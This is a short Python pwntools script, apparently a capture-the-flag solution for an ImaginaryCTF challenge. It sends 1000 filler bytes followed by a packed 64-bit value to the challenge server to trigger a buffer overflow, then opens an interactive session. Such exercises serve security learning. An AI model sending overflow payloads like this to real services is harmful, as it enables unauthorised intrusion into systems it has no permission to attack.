from pwn import *

buffer = "a"*1000
value = p64(0x3e3e3e3e3e3e3e3e)
payload = buffer.encode()+value
r = remote('puzzler7.imaginaryctf.org',1111)
r.sendlineafter(b'unterminated.',payload)

#r.send()

r.interactive()